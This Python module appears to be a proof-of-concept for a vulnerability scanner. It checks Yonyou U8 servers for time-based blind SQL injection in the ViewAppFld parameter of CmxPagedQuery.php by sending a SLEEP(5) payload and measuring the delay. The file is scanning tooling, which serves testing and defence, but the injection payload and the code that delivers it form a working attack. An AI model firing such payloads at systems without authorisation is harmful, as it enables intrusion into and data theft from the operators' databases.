# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0030'  # 平台漏洞编号，留空
    name = '用友u8 CmxPagedQuery.php参数ViewAppFld存在sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-15'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友u8 CmxPagedQuery.php参数ViewAppFld存在sql注入
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=119763'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '37f81544-0f32-4d78-a6e2-8e5165e994a1'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            path = "/Server/CmxPagedQuery.php?pgid=AppList"
            target = arg + path
            fst_sta = time.time()
            code1, head, res, errcode, _url = hh.http(target)
            fst_end = time.time()

            payload = "ViewAppFld=1) AND (SELECT * FROM (SELECT(SLEEP(5)))Tzqe) AND (6547=6547&ViewAppValue=2"
            target = arg + path
            sec_sta = time.time()
            code2, head, res, errcode, _url = hh.http(target, payload)
            sec_end = time.time()

            fst = fst_end-fst_sta
            sec = sec_end-sec_sta
            if code1 != 0 and code2 != 0 and 4.01 < sec-fst < 6.0:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
